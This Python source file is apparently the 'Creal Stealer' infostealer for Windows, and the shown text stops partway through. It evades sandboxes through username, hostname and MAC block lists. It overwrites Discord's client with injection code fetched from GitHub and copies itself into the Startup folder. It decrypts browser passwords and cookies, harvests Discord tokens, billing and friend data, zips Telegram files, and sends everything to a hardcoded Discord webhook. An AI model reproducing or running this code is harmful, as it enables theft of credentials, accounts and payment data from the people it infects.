import os
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import *
import time
import shutil
from zipfile import ZipFile
import random
import re
import subprocess
import sys
import shutil
import uuid
import socket
import getpass



blacklistUsers = ['WDAGUtilityAccount', '3W1GJT', 'QZSBJVWM', '5ISYH9SH', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg']

username = getpass.getuser()

if username.lower() in blacklistUsers:
    os._exit(0)

def kontrol():

    blacklistUsername = ['BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']

    hostname = socket.gethostname()

    if any(name in hostname for name in blacklistUsername):
        os._exit(0)

kontrol()

BLACKLIST1 = ['00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de', '00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40', '42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01', '42:85:07:f4:83:d0', '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c', '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa', '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3', '00:15:5d:b6:e0:cc', '00:15:5d:00:02:26', '00:50:56:b3:05:b4', '1c:99:57:1c:ad:e4', '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:45:03', '12:8a:5c:2a:65:d1', '00:25:90:36:f0:3b', '00:1b:21:13:21:26', '42:01:0a:8a:00:22', '00:1b:21:13:32:51', 'a6:24:aa:ae:e6:12', '08:00:27:45:13:10', '00:1b:21:13:26:44', '3c:ec:ef:43:fe:de', 'd4:81:d7:ed:25:54', '00:25:90:36:65:38', '00:03:47:63:8b:de', '00:15:5d:00:05:8d', '00:0c:29:52:52:50', '00:50:56:b3:42:33', '3c:ec:ef:44:01:0c', '06:75:91:59:3e:02', '42:01:0a:8a:00:33', 'ea:f6:f1:a2:33:76', 'ac:1f:6b:d0:4d:98', '1e:6c:34:93:68:64', '00:50:56:a0:61:aa', '42:01:0a:96:00:22', '00:50:56:b3:21:29', '00:15:5d:00:00:b3', '96:2b:e9:43:96:76', 'b4:a9:5a:b1:c6:fd', 'd4:81:d7:87:05:ab', 'ac:1f:6b:d0:49:86', '52:54:00:8b:a6:08', '00:0c:29:05:d8:6e', '00:23:cd:ff:94:f0', '00:e0:4c:d6:86:77', '3c:ec:ef:44:01:aa', '00:15:5d:23:4c:a3', '00:1b:21:13:33:55', '00:15:5d:00:00:a4', '16:ef:22:04:af:76', '00:15:5d:23:4c:ad', '1a:6c:62:60:3b:f4', '00:15:5d:00:00:1d', '00:50:56:a0:cd:a8', '00:50:56:b3:fa:23', '52:54:00:a0:41:92', '00:50:56:b3:f6:57', '00:e0:4c:56:42:97', 'ca:4d:4b:ca:18:cc', 'f6:a5:41:31:b2:78', 'd6:03:e4:ab:77:8e', '00:50:56:ae:b2:b0', '00:50:56:b3:94:cb', '42:01:0a:8e:00:22', '00:50:56:b3:4c:bf', '00:50:56:b3:09:9e', '00:50:56:b3:38:88', '00:50:56:a0:d0:fa', '00:50:56:b3:91:c8', '3e:c1:fd:f1:bf:71', '00:50:56:a0:6d:86', '00:50:56:a0:af:75', '00:50:56:b3:dd:03', 'c2:ee:af:fd:29:21', '00:50:56:b3:ee:e1', '00:50:56:a0:84:88', '00:1b:21:13:32:20', '3c:ec:ef:44:00:d0', '00:50:56:ae:e5:d5', '00:50:56:97:f6:c8', '52:54:00:ab:de:59', '00:50:56:b3:9e:9e', '00:50:56:a0:39:18', '32:11:4d:d0:4a:9e', '00:50:56:b3:d0:a7', '94:de:80:de:1a:35', '00:50:56:ae:5d:ea', '00:50:56:b3:14:59', 'ea:02:75:3c:90:9f', '00:e0:4c:44:76:54', 'ac:1f:6b:d0:4d:e4', '52:54:00:3b:78:24', '00:50:56:b3:50:de', '7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e', '5a:e2:a6:a4:44:db', '00:50:56:ae:6f:54', '42:01:0a:96:00:33', '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06', '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d', '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e']

mac_address = uuid.getnode()
if str(uuid.UUID(int=mac_address)) in BLACKLIST1:
    os._exit(0)




wh00k = "https://discord.com/api/webhooks/1094671680841981982/SpcrFYhm-FujAX5QQYn18yqObRshX5dAIIw3lYQnIv9LRNolrCXiBHeJ-B7LLYb_FuTg"
inj_url = "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
    
DETECTED = False
#bir ucaktik dustuk bir gemiydik battik :(
def g3t1p():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

requirements = [
    ["requests", "requests"],
    ["Crypto.Cipher", "pycryptodome"],
]
for modl in requirements:
    try: __import__(modl[0])
    except:
        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
        time.sleep(3)

import requests
from Crypto.Cipher import AES

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
Threadlist = []


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def G3tD4t4(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return G3tD4t4(blob_out)

def D3kryptV4lU3(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

def L04dR3qu3sTs(methode, url, data='', files='', headers=''):
    for i in range(8): # max trys
        try:
            if methode == 'POST':
                if data != '':
                    r = requests.post(url, data=data)
                    if r.status_code == 200:
                        return r
                elif files != '':
                    r = requests.post(url, files=files)
                    if r.status_code == 200 or r.status_code == 413:
                        return r
        except:
            pass

def L04durl1b(wh00k, data='', files='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(wh00k, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(wh00k, data=data))
                return r
        except: 
            pass

def globalInfo():
    ip = g3t1p()
    us3rn4m1 = os.getenv("USERNAME")
    ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}')
    # print(ipdatanojson)
    ipdata = loads(ipdatanojson)
    # print(urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode())
    contry = ipdata["country_name"]
    contryCode = ipdata["country_code"].lower()
    sehir = ipdata["state"]

    globalinfo = f":flag_{contryCode}:  - `{us3rn4m1.upper()} | {ip} ({contry})`"
    return globalinfo


def TR6st(C00k13):
    # simple Trust Factor system
    global DETECTED
    data = str(C00k13)
    tim = re.findall(".google.com", data)
    # print(len(tim))
    if len(tim) < -1:
        DETECTED = True
        return DETECTED
    else:
        DETECTED = False
        return DETECTED
        
def G3tUHQFr13ndS(t0k3n):
    b4dg3List =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
    except:
        return False

    uhqlist = ''
    for friend in friendlist:
        Own3dB3dg4s = ''
        flags = friend['user']['public_flags']
        for b4dg3 in b4dg3List:
            if flags // b4dg3["Value"] != 0 and friend['type'] == 1:
                if not "House" in b4dg3["Name"]:
                    Own3dB3dg4s += b4dg3["Emoji"]
                flags = flags % b4dg3["Value"]
        if Own3dB3dg4s != '':
            uhqlist += f"{Own3dB3dg4s} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
    return uhqlist


process_list = os.popen('tasklist').readlines()


for process in process_list:
    if "Discord" in process:
        
        pid = int(process.split()[1])
        os.system(f"taskkill /F /PID {pid}")

def G3tb1ll1ng(t0k3n):
    headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        b1ll1ngjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except:
        return False
    
    if b1ll1ngjson == []: return "```None```"

    b1ll1ng = ""
    for methode in b1ll1ngjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                b1ll1ng += ":credit_card:"
            elif methode["type"] == 2:
                b1ll1ng += ":parking: "

    return b1ll1ng

def inj_discord():

    username = os.getlogin()

    folder_list = ['Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment']

    for folder_name in folder_list:
        deneme_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)
        if os.path.isdir(deneme_path):
            for subdir, dirs, files in os.walk(deneme_path):
                if 'app-' in subdir:
                    for dir in dirs:
                        if 'modules' in dir:
                            module_path = os.path.join(subdir, dir)
                            for subsubdir, subdirs, subfiles in os.walk(module_path):
                                if 'discord_desktop_core-' in subsubdir:
                                    for subsubsubdir, subsubdirs, subsubfiles in os.walk(subsubdir):
                                        if 'discord_desktop_core' in subsubsubdir:
                                            for file in subsubfiles:
                                                if file == 'index.js':
                                                    file_path = os.path.join(subsubsubdir, file)

                                                    inj_content = requests.get(inj_url).text

                                                    inj_content = inj_content.replace("%WEBHOOK%", wh00k)

                                                    with open(file_path, "w", encoding="utf-8") as index_file:
                                                        index_file.write(inj_content)
inj_discord()

def G3tB4dg31(flags):
    if flags == 0: return ''

    Own3dB3dg4s = ''
    b4dg3List =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    for b4dg3 in b4dg3List:
        if flags // b4dg3["Value"] != 0:
            Own3dB3dg4s += b4dg3["Emoji"]
            flags = flags % b4dg3["Value"]

    return Own3dB3dg4s

def G3tT0k4n1nf9(t0k3n):
    headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    us3rjs0n = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    us3rn4m1 = us3rjs0n["username"]
    hashtag = us3rjs0n["discriminator"]
    em31l = us3rjs0n["email"]
    idd = us3rjs0n["id"]
    pfp = us3rjs0n["avatar"]
    flags = us3rjs0n["public_flags"]
    n1tr0 = ""
    ph0n3 = ""

    if "premium_type" in us3rjs0n: 
        nitrot = us3rjs0n["premium_type"]
        if nitrot == 1:
            n1tr0 = "<a:DE_BadgeNitro:865242433692762122>"
        elif nitrot == 2:
            n1tr0 = "<a:DE_BadgeNitro:865242433692762122><a:autr_boost1:1038724321771786240>"
    if "ph0n3" in us3rjs0n: ph0n3 = f'{us3rjs0n["ph0n3"]}'

    return us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3

def ch1ckT4k1n(t0k3n):
    headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False

if getattr(sys, 'frozen', False):
    currentFilePath = os.path.dirname(sys.executable)
else:
    currentFilePath = os.path.dirname(os.path.abspath(__file__))

fileName = os.path.basename(sys.argv[0])
filePath = os.path.join(currentFilePath, fileName)

startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
startupFilePath = os.path.join(startupFolderPath, fileName)

if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower():
    with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
        shutil.copyfileobj(src_file, dst_file)


def upl05dT4k31(t0k3n, path):
    global wh00k
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3 = G3tT0k4n1nf9(t0k3n)

    if pfp == None: 
        pfp = "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
    else:
        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"

    b1ll1ng = G3tb1ll1ng(t0k3n)
    b4dg3 = G3tB4dg31(flags)
    friends = G3tUHQFr13ndS(t0k3n)
    if friends == '': friends = "```No Rare Friends```"
    if not b1ll1ng:
        b4dg3, ph0n3, b1ll1ng = "🔒", "🔒", "🔒"
    if n1tr0 == '' and b4dg3 == '': n1tr0 = "```None```"

    data = {
        "content": f'{globalInfo()} | `{path}`',
        "embeds": [
            {
            "color": 2895667,
            "fields": [
                {
                    "name": "<a:hyperNOPPERS:828369518199308388> Token:",
                    "value": f"```{t0k3n}```",
                    "inline": True
                },
                {
                    "name": "<:mail:750393870507966486> Email:",
                    "value": f"```{em31l}```",
                    "inline": True
                },
                {
                    "name": "<a:1689_Ringing_Phone:755219417075417088> Phone:",
                    "value": f"```{ph0n3}```",
                    "inline": True
                },
                {
                    "name": "<:mc_earth:589630396476555264> IP:",
                    "value": f"```{g3t1p()}```",
                    "inline": True
                },
                {
                    "name": "<:woozyface:874220843528486923> Badges:",
                    "value": f"{n1tr0}{b4dg3}",
                    "inline": True
                },
                {
                    "name": "<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Billing:",
                    "value": f"{b1ll1ng}",
                    "inline": True
                },
                {
                    "name": "<a:mavikirmizi:853238372591599617> HQ Friends:",
                    "value": f"{friends}",
                    "inline": False
                }
                ],
            "author": {
                "name": f"{us3rn4m1}#{hashtag} ({idd})",
                "icon_url": f"{pfp}"
                },
            "footer": {
                "text": "Creal Stealer",
                "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
            }
        ],
        "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
        "username": "Creal Stealer",
        "attachments": []
        }
    L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)

#hersey son defa :(
def R4f0rm3t(listt):
    e = re.findall("(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

def upload(name, link):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    if name == "crcook":
        rb = ' | '.join(da for da in cookiWords)
        if len(rb) > 1000: 
            rrrrr = R4f0rm3t(str(cookiWords))
            rb = ' | '.join(da for da in rrrrr)
        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                    "title": "Creal | Cookies Stealer",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealCookies.txt]({link})",
                    "color": 2895667,
                    "footer": {
                        "text": "Creal Stealer",
                        "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
                    }
                }
            ],
            "username": "Creal Stealer",
            "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
            "attachments": []
            }
        L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
        return

    if name == "crpassw":
        ra = ' | '.join(da for da in paswWords)
        if len(ra) > 1000: 
            rrr = R4f0rm3t(str(paswWords))
            ra = ' | '.join(da for da in rrr)

        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                    "title": "Creal | Password Stealer",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealPassword.txt]({link})",
                    "color": 2895667,
                    "footer": {
                        "text": "Creal Stealer",
                        "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
                    }
                }
            ],
            "username": "Creal",
            "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
            "attachments": []
            }
        L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
        return

    if name == "kiwi":
        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                "color": 2895667,
                "fields": [
                    {
                    "name": "Interesting files found on user PC:",
                    "value": link
                    }
                ],
                "author": {
                    "name": "Creal | File Stealer"
                },
                "footer": {
                    "text": "Creal Stealer",
                    "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
                }
                }
            ],
            "username": "Creal Stealer",
            "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
            "attachments": []
            }
        L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
        return




# def upload(name, tk=''):
#     headers = {
#         "Content-Type": "application/json",
#         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
#     }

#     # r = requests.post(hook, files=files)
#     LoadRequests("POST", hook, files=files)
    _




def wr1tef0rf1l3(data, name):
    path = os.getenv("TEMP") + f"\cr{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"<--Creal STEALER BEST -->\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

T0k3ns = ''
def getT0k3n(path, arg):
    if not os.path.exists(path): return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for t0k3n in re.findall(regex, line):
                        global T0k3ns
                        if ch1ckT4k1n(t0k3n):
                            if not t0k3n in T0k3ns:
                                # print(token)
                                T0k3ns += t0k3n
                                upl05dT4k31(t0k3n, path)

P4ssw = []
def getP4ssw(path, arg):
    global P4ssw, P4sswCount
    if not os.path.exists(path): return

    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0: return

    tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in paswWords: paswWords.append(old)
            P4ssw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {D3kryptV4lU3(row[2], master_key)}")
            P4sswCount += 1
    wr1tef0rf1l3(P4ssw, 'passw')

C00k13 = []    
def getC00k13(path, arg):
    global C00k13, CookiCount
    if not os.path.exists(path): return
    
    pathC = path + arg + "/Cookies"
    if os.stat(pathC).st_size == 0: return
    
    tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
    
    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in cookiWords: cookiWords.append(old)
            C00k13.append(f"{row[0]}	TRUE	/	FALSE	2597573456	{row[1]}	{D3kryptV4lU3(row[2], master_key)}")
            CookiCount += 1
    wr1tef0rf1l3(C00k13, 'cook')

def G3tD1sc0rd(path, arg):
    if not os.path.exists(f"{path}/Local State"): return

    pathC = path + arg

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])
    # print(path, master_key)
    
    for file in os.listdir(pathC):
        # print(path, file)
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                for t0k3n in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global T0k3ns
                    t0k3nDecoded = D3kryptV4lU3(b64decode(t0k3n.split('dQw4w9WgXcQ:')[1]), master_key)
                    if ch1ckT4k1n(t0k3nDecoded):
                        if not t0k3nDecoded in T0k3ns:
                            # print(token)
                            T0k3ns += t0k3nDecoded
                            # writeforfile(Tokens, 'tokens')
                            upl05dT4k31(t0k3nDecoded, path)

def GatherZips(paths1, paths2, paths3):
    thttht = []
    for patt in paths1:
        a = threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[5], patt[1]])
        a.start()
        thttht.append(a)

    for patt in paths2:
        a = threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)
    
    a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht: 
        thread.join()
    global WalletsZip, GamingZip, OtherZip
        # print(WalletsZip, GamingZip, OtherZip)

    wal, ga, ot = "",'',''
    if not len(WalletsZip) == 0:
        wal = ":coin:  •  Wallets\n"
        for i in WalletsZip:
            wal += f"└─ [{i[0]}]({i[1]})\n"
    if not len(WalletsZip) == 0:
        ga = ":video_game:  •  Gaming:\n"
        for i in GamingZip:
            ga += f"└─ [{i[0]}]({i[1]})\n"
    if not len(OtherZip) == 0:
        ot = ":tickets:  •  Apps\n"
        for i in OtherZip:
            ot += f"└─ [{i[0]}]({i[1]})\n"          
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    
    data = {
        "content": globalInfo(),
        "embeds": [
            {
            "title": "Creal Zips",
            "description": f"{wal}\n{ga}\n{ot}",
            "color": 2895667,
            "footer": {
                "text": "Creal Stealer",
                "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
            }
            }
        ],
        "username": "Creal Stealer",
        "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
        "attachments": []
    }
    L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)


def ZipTelegram(path, arg, procc):
    global OtherZip
    pathC = path
    name = arg
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file and not "tdummy" in file and not "user_data" in file and not "webview" in file: 
            zf.write(pathC + "/" + file)
    zf.close()

